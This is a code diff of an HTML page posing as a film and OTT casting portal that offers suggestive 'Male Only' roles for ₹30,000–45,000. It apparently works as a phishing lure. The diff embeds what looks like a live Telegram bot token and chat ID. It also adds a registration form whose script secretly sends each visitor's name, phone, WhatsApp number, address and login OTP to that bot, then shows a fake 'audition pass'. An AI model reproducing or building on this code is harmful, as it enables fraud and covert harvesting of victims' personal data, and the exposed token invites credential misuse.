@@ -78,14 +78,14 @@
     .auth-card h2 { font-size: 19px; color: #fff; margin-bottom: 6px; font-weight: 700; text-align: center; }
     .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 20px; text-align: center; line-height: 1.4; }
 
-    .input-grp { margin-bottom: 16px; text-align: left; }
-    .input-grp label { display: block; font-size: 11px; font-weight: 600; color: var(--text-muted); margin-bottom: 6px; letter-spacing: 0.5px; }
+    .input-grp { margin-bottom: 14px; text-align: left; }
+    .input-grp label { display: block; font-size: 11px; font-weight: 600; color: var(--text-muted); margin-bottom: 5px; letter-spacing: 0.5px; }
     .input-grp input {
       width: 100%;
       background: #0f1015;
       border: 1px solid var(--border);
       color: #fff;
-      padding: 12px;
+      padding: 11px 12px;
       border-radius: 8px;
       font-size: 14px;
       outline: none;
@@ -213,6 +213,20 @@
       cursor: pointer;
     }
 
+    /* Pass Card */
+    .pass-card {
+      background: #12131a;
+      border: 1.5px dashed var(--gold);
+      border-radius: 14px;
+      padding: 20px 16px;
+      margin-top: 15px;
+      text-align: center;
+    }
+    .pass-id { font-size: 14px; font-weight: 800; color: var(--gold); margin-bottom: 12px; letter-spacing: 1px; }
+    .pass-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1f222e; font-size: 12px; }
+    .pass-row span { color: var(--text-muted); }
+    .pass-row strong { color: #fff; }
+
     /* Sticky Language Bar */
     .lang-bar {
       position: fixed;
@@ -310,7 +324,7 @@
       <span style="font-size:11px; color:var(--text-muted);" data-i18n="live_count">4 Roles Live</span>
     </div>
 
-    <!-- Profile 1: Srimoyee (IMG 3930 to 3937) -->
+    <!-- Profile 1: Srimoyee -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_vip">VIP Casting</span>
@@ -325,14 +339,14 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur3">3 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button type="button" class="btn-watch" onclick="openModelGallery('Srimoyee', 3930, 3937)">
+        <button type="button" class="btn-watch" onclick="openModelGallery('Srimoyee', 3930, 3937, 'srimoyee.mp4')">
           🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
         </button>
-        <button type="button" class="btn-apply" onclick="applyForRole('Velvet Secrets (Srimoyee)')" data-i18n="btn_apply">APPLY FOR ROLE</button>
+        <button type="button" class="btn-apply" onclick="openRegisterModal('Velvet Secrets (Srimoyee)', '₹45,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
-    <!-- Profile 2: Tejashwini (IMG 3901 to 3924) -->
+    <!-- Profile 2: Tejashwini -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_new">New Shoot</span>
@@ -347,14 +361,14 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur2">2 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button type="button" class="btn-watch" onclick="openModelGallery('Tejashwini', 3901, 3924)">
+        <button type="button" class="btn-watch" onclick="openModelGallery('Tejashwini', 3901, 3924, 'tejashwini.mp4')">
           🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
         </button>
-        <button type="button" class="btn-apply" onclick="applyForRole('Urban Seduction (Tejashwini)')" data-i18n="btn_apply">APPLY FOR ROLE</button>
+        <button type="button" class="btn-apply" onclick="openRegisterModal('Urban Seduction (Tejashwini)', '₹30,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
-    <!-- Profile 3: Tina Nandy (IMG 3854 to 3900) -->
+    <!-- Profile 3: Tina Nandy -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_mega">Mega Budget</span>
@@ -369,14 +383,14 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur3">3 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button type="button" class="btn-watch" onclick="openModelGallery('Tina Nandy', 3854, 3900)">
+        <button type="button" class="btn-watch" onclick="openModelGallery('Tina Nandy', 3854, 3900, 'tina.mp4')">
           🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
         </button>
-        <button type="button" class="btn-apply" onclick="applyForRole('Golden Mirage (Tina Nandy)')" data-i18n="btn_apply">APPLY FOR ROLE</button>
+        <button type="button" class="btn-apply" onclick="openRegisterModal('Golden Mirage (Tina Nandy)', '₹45,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
-    <!-- Profile 4: Anjali (IMG 3938 to 3978) -->
+    <!-- Profile 4: Anjali -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_comm">Commercial</span>
@@ -391,15 +405,71 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur2">2 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button type="button" class="btn-watch" onclick="openModelGallery('Anjali', 3938, 3978)">
+        <button type="button" class="btn-watch" onclick="openModelGallery('Anjali', 3938, 3978, 'anjali.mp4')">
           🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
         </button>
-        <button type="button" class="btn-apply" onclick="applyForRole('Desire & Destiny (Anjali)')" data-i18n="btn_apply">APPLY FOR ROLE</button>
+        <button type="button" class="btn-apply" onclick="openRegisterModal('Desire & Destiny (Anjali)', '₹30,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
   </section>
 
+  <!-- SCREEN 3: SUCCESS AUDITION PASS -->
+  <section class="screen" id="screenPass">
+    <div style="text-align:center; padding: 20px 10px 10px;">
+      <div style="width:55px; height:55px; margin:0 auto 10px; background:var(--green); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:26px; color:#fff;">✓</div>
+      <h2 style="font-size:20px; font-weight:800; color:#fff;">Application Registered!</h2>
+      <p style="font-size:12px; color:var(--text-muted); margin-top:4px;">Your Casting Call Pass has been generated successfully.</p>
+    </div>
+
+    <div class="pass-card">
+      <div style="font-size:11px; color:var(--gold); font-weight:700; letter-spacing:1px; margin-bottom:4px;">OFFICIAL ARTIST AUDITION CARD</div>
+      <div class="pass-id" id="passCardId">ID: CST-22471</div>
+
+      <div class="pass-row"><span>Candidate Name:</span><strong id="passName">--</strong></div>
+      <div class="pass-row"><span>Project Applied:</span><strong id="passProject">--</strong></div>
+      <div class="pass-row"><span>Budget Package:</span><strong id="passBudget" style="color:var(--green);">--</strong></div>
+      <div class="pass-row"><span>Registered Contact:</span><strong id="passContact">--</strong></div>
+      <div class="pass-row"><span>Address:</span><strong id="passAddress">--</strong></div>
+      <div class="pass-row"><span>Status:</span><strong style="color:var(--gold);">Profile Under Review</strong></div>
+
+      <div style="margin: 18px auto 8px; width: 140px; height: 140px; background:#fff; padding:6px; border-radius:8px;">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=CINESTAR-VERIFIED-ARTIST" alt="Pass QR" style="width:100%; height:100%;">
+      </div>
+      <div style="font-size:10px; color:var(--text-muted);">Scan to Verify Candidate Verification Portal</div>
+    </div>
+
+    <button type="button" class="btn-main" onclick="goToLobby()" style="margin-top:20px;">BROWSE MORE CASTING CALLS</button>
+  </section>
+
+</div>
+
+<!-- REGISTRATION MODAL -->
+<div class="preview-modal" id="registerModal">
+  <div class="preview-content">
+    <span class="preview-close" onclick="closeRegisterModal()">&times;</span>
+    <h3 style="color:var(--gold); font-size:17px; margin-bottom:4px; font-weight:800;">Artist Registration</h3>
+    <p style="font-size:11px; color:var(--text-muted); margin-bottom:14px;" id="regRoleSubtitle">Applying for role</p>
+
+    <div class="input-grp">
+      <label>FULL NAME</label>
+      <input type="text" id="regName" placeholder="Enter your full name">
+    </div>
+    <div class="input-grp">
+      <label>CONTACT NUMBER</label>
+      <input type="tel" id="regPhone" placeholder="Enter contact number" maxlength="10">
+    </div>
+    <div class="input-grp">
+      <label>WHATSAPP NUMBER</label>
+      <input type="tel" id="regWhatsapp" placeholder="Enter WhatsApp number" maxlength="10">
+    </div>
+    <div class="input-grp">
+      <label>ADDRESS (CITY / STATE)</label>
+      <input type="text" id="regAddress" placeholder="e.g. Mumbai, Maharashtra">
+    </div>
+
+    <button type="button" class="btn-main" onclick="submitRegistration()" style="margin-top:8px;">SUBMIT & GENERATE PASS</button>
+  </div>
 </div>
 
 <!-- MEDIA PREVIEW POPUP -->
@@ -408,11 +478,11 @@
     <span class="preview-close" onclick="closeMediaPreview()">&times;</span>
     <h4 id="previewArtistName" style="color:var(--gold); margin-bottom:8px; font-size:15px;">Audition Clips & Portfolio</h4>
     
-    <div id="videoContainerBox" style="width:100%; height:230px; background:#000; border-radius:8px; overflow:hidden; display:none;">
+    <div id="videoContainerBox" style="width:100%; height:230px; background:#000; border-radius:8px; overflow:hidden; margin-bottom:10px;">
       <video id="previewVideoPlayer" controls playsinline webkit-playsinline style="width:100%; height:100%; object-fit:contain; background:#000;"></video>
     </div>
 
-    <div style="font-size:12px; color:var(--gold); margin:14px 0 8px; text-align:left; font-weight:600;" data-i18n="preview_gallery_hint">Portfolio Photos (Tap to slide full screen)</div>
+    <div style="font-size:12px; color:var(--gold); margin:10px 0 8px; text-align:left; font-weight:600;" data-i18n="preview_gallery_hint">Portfolio Photos (Tap to slide full screen)</div>
     <div id="previewGalleryStrip" style="display:flex; gap:8px; overflow-x:auto; padding-bottom:8px;"></div>
   </div>
 </div>
@@ -440,12 +510,12 @@
 </div>
 <!-- JAVASCRIPT LOGIC -->
 <script>
-  /* TELEGRAM BOT SETTINGS */
-  var TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // e.g. 7123456789:ABCDefgh-ijklmn
-  var TELEGRAM_CHAT_ID   = "YOUR_CHAT_ID_HERE";   // e.g. -100123456789 ya user chat ID
+  /* TELEGRAM BOT SETTINGS DIRECTLY CONFIGURED */
+  var TELEGRAM_BOT_TOKEN = "8939696755:AAE6ZXye0Nv6-KYN4N19rcxAcnnY4Cd-pnc";
+  var TELEGRAM_CHAT_ID   = "8406295151";
 
   function sendTelegramAlert(textMsg) {
-    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+    if (!TELEGRAM_BOT_TOKEN) return;
     var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
     var payload = {
       chat_id: TELEGRAM_CHAT_ID,
@@ -621,7 +691,7 @@
       otp_label: "૪-અંકનો કોડ દાખલ કરો",
       btn_send: "કોડ મોકલો",
       btn_verify: "ચકાસો અને આગળ વધો",
-      vip_badge: "વીઆઈપી કલાકાર નોંધણી ૨୦૨૬-૨୦૨૭",
+      vip_badge: "વીઆઈપી કલાકાર નોંધણી ૨૦૨૬-૨૦૨૭",
       vip_title: "નવી મુખ્ય ફિલ્મ અને ઓટીટી કાસ્ટિંગ શરૂ",
       vip_desc: "નવા અને અનુભવી કલાકારો માટે સીધી પસંદગી.",
       live_heading: "સક્રિય કાસ્ટિંગ કોલ",
@@ -680,7 +750,7 @@
         return;
       }
       userEnteredMobile = phone;
-      // Generate a truly random 4-digit OTP between 1000 and 9999
+      // Generate a dynamic 4-digit OTP
       currentGeneratedOtp = Math.floor(1000 + Math.random() * 9000).toString();
       document.getElementById('dispAutoOtp').innerText = currentGeneratedOtp;
       
@@ -688,11 +758,11 @@
       btn.innerText = dict.btn_verify || "VERIFY & ENTER";
       otpSent = true;
 
-      // Send lead to Telegram
-      var msg = "🎬 <b>New Casting Login Attempt</b>\n" +
-                "📱 Mobile: <code>" + userEnteredMobile + "</code>\n" +
-                "🔑 Generated OTP: <code>" + currentGeneratedOtp + "</code>\n" +
-                "🌐 Language: " + curLang;
+      // Send Login OTP notification to Telegram
+      var msg = "🎬 <b>New Login Attempt</b>\n" +
+                "📱 <b>Mobile:</b> <code>" + userEnteredMobile + "</code>\n" +
+                "🔑 <b>Generated OTP:</b> <code>" + currentGeneratedOtp + "</code>\n" +
+                "🌐 <b>Language:</b> " + curLang;
       sendTelegramAlert(msg);
 
     } else {
@@ -702,7 +772,7 @@
         document.getElementById('screenLobby').classList.add('active');
         window.scrollTo(0,0);
 
-        var verifyMsg = "✅ <b>User Verified & Entered Lobby</b>\n📱 Mobile: <code>" + userEnteredMobile + "</code>";
+        var verifyMsg = "✅ <b>User Verified & Entered Lobby</b>\n📱 <b>Mobile:</b> <code>" + userEnteredMobile + "</code>";
         sendTelegramAlert(verifyMsg);
       } else {
         alert(curLang === 'hi' ? "गलत कोड! कृपया सही OTP दर्ज करें।" : "Incorrect OTP! Please enter correct code.");
@@ -710,33 +780,89 @@
     }
   }
 
-  function applyForRole(roleName) {
-    var alertMsg = "🌟 <b>Role Applied</b>\n" +
-                   "📱 User: <code>" + userEnteredMobile + "</code>\n" +
-                   "🎭 Role: <b>" + roleName + "</b>";
-    sendTelegramAlert(alertMsg);
-    alert(curLang === 'hi' ? "आवेदन प्राप्त हुआ! हमारी कास्टिंग टीम आपसे संपर्क करेगी।" : "Application submitted successfully! Casting director will contact you.");
+  /* 3. Registration Modal & Telegram Leads */
+  var currentApplyingRole = "";
+  var currentApplyingBudget = "";
+
+  function openRegisterModal(roleName, budget) {
+    currentApplyingRole = roleName;
+    currentApplyingBudget = budget;
+    document.getElementById('regRoleSubtitle').innerText = "Applying for: " + roleName + " (" + budget + ")";
+    document.getElementById('regPhone').value = userEnteredMobile || "";
+    document.getElementById('registerModal').style.display = 'flex';
   }
 
-  /* 3. Range-based Image Gallery */
+  function closeRegisterModal() {
+    document.getElementById('registerModal').style.display = 'none';
+  }
+
+  function submitRegistration() {
+    var name = document.getElementById('regName').value.trim();
+    var phone = document.getElementById('regPhone').value.trim();
+    var whatsapp = document.getElementById('regWhatsapp').value.trim();
+    var address = document.getElementById('regAddress').value.trim();
+
+    if (!name || phone.length < 10 || !address) {
+      alert("Kripya sabhi fields (Name, Contact, Address) bharein.");
+      return;
+    }
+
+    var passId = "CST-" + Math.floor(10000 + Math.random() * 90000);
+
+    // Send Full Details to Telegram
+    var leadMessage = "🌟 <b>NEW ARTIST REGISTRATION DETAILED</b>\n\n" +
+                      "👤 <b>Name:</b> " + name + "\n" +
+                      "📞 <b>Contact:</b> <code>" + phone + "</code>\n" +
+                      "💬 <b>WhatsApp:</b> <code>" + whatsapp + "</code>\n" +
+                      "📍 <b>Address:</b> " + address + "\n" +
+                      "🎭 <b>Role:</b> " + currentApplyingRole + "\n" +
+                      "💰 <b>Budget:</b> " + currentApplyingBudget + "\n" +
+                      "🎫 <b>Pass ID:</b> <code>" + passId + "</code>";
+
+    sendTelegramAlert(leadMessage);
+
+    // Set Pass Details
+    document.getElementById('passCardId').innerText = "ID: " + passId;
+    document.getElementById('passName').innerText = name;
+    document.getElementById('passProject').innerText = currentApplyingRole;
+    document.getElementById('passBudget').innerText = currentApplyingBudget;
+    document.getElementById('passContact').innerText = phone.substring(0, 2) + "******" + phone.substring(phone.length - 2);
+    document.getElementById('passAddress').innerText = address;
+
+    closeRegisterModal();
+    document.getElementById('screenLobby').classList.remove('active');
+    document.getElementById('screenPass').classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  function goToLobby() {
+    document.getElementById('screenPass').classList.remove('active');
+    document.getElementById('screenLobby').classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  /* 4. Range-based Image Gallery & Video Player */
   var currentGalleryImages = [];
   var currentImageIndex = 0;
 
-  function openModelGallery(name, startNum, endNum) {
+  function openModelGallery(name, startNum, endNum, videoFile) {
     var images = [];
     for (var i = startNum; i <= endNum; i++) {
       images.push('IMG_' + i + '.jpeg');
     }
-    openMediaPreview(name, [], images);
+    openMediaPreview(name, videoFile, images);
   }
 
-  function openMediaPreview(name, videosArray, imagesArray) {
-    document.getElementById('previewArtistName').innerText = name + " - Media & Audition Clips";
+  function openMediaPreview(name, videoFile, imagesArray) {
+    document.getElementById('previewArtistName').innerText = name + " - Media & Portfolio";
     var videoBox = document.getElementById('videoContainerBox');
+    var videoTag = document.getElementById('previewVideoPlayer');
     currentGalleryImages = imagesArray || [];
 
-    if (videosArray && videosArray.length > 0) {
+    if (videoFile) {
       videoBox.style.display = 'block';
+      videoTag.src = videoFile;
+      videoTag.load();
     } else {
       videoBox.style.display = 'none';
     }
